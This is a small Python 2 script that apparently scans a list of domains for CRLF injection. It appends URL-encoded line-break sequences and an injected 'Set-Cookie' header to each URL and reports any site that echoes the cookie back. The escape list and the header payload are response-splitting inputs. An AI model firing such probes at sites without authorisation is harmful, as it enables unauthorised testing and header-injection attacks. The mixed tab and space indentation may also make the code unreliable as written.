import requests
import sys
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, wait, as_completed
from time import sleep
import config
import eventlet

ESCAPE_LIST = ['%0d','%0a', '%0d%0a', '%23%0d', '%23%0a', '%23%0d%0a', '\\x0a\\x0d']
APPEND_LIST = ["/", "/crlf", "/?crlf=", "/#"]
DEFAULT_INJ = "Set-Cookie: param=crlf;"
TIMEOUT = 5
found_list = []



def scan(url):
	requests.packages.urllib3.disable_warnings()
	global found_list
	for append in APPEND_LIST:
            for escape in ESCAPE_LIST:
		crlf_url = "https://"+url.strip() + append + escape + DEFAULT_INJ
		session = requests.Session()
		with eventlet.Timeout(TIMEOUT):
                    try:
                        session.get(crlf_url,timeout=5)
			print colored('[-] Testing: '+crlf_url,'blue')
                    except:
                        pass
                    if 'param' in session.cookies.get_dict() or 'crlf' in session.cookies.get_dict().values():
			print colored('[+]POSSIBLE CRLF! '+crlf_url,'green')

def crlfscan(domainlist):
	tpool = ThreadPoolExecutor(config.REQUESTS_THREADS)
	futures = [tpool.submit(scan,domain) for domain in domainlist]
	print colored('[-]Testing for crlf injection...','blue')
	tpool.shutdown(True)
	

	
